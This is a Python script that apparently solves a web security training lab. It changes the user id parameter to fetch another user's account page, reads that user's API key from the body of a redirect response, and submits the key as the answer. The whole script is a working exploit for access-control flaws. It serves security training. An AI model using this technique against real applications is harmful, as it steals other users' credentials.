####################################################################################
#
# Lab: User ID controlled by request parameter with data leakage in redirect
#
# Hack Steps: 
#      1. Fetch carlos profile
#      2. Extract the API key from response body before redirecting to login page
#      3. Submit the solution
#
####################################################################################
import requests
import re
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0af600c4048af9c48119ac4a00a0007d.web-security-academy.net"

def main():
    print(Fore.WHITE + "⦗1⦘ Fetching carlos profile page.. ", end="", flush=True)
    
    carlos_profile = fetch("/my-account?id=carlos")

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Extracting the API key.. ", end="", flush=True)
    
    api_key = re.findall("Your API Key is: (.*)</div>", carlos_profile.text)[0]
    
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗3⦘ Submitting the solution.. ", end="", flush=True)
    
    data = { "answer": api_key }
    post_data("/submitSolution", data)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")
    

def fetch(path):
    try:  
        return requests.get(f"{LAB_URL}{path}", allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)
        
        
if __name__ == "__main__":
    main()

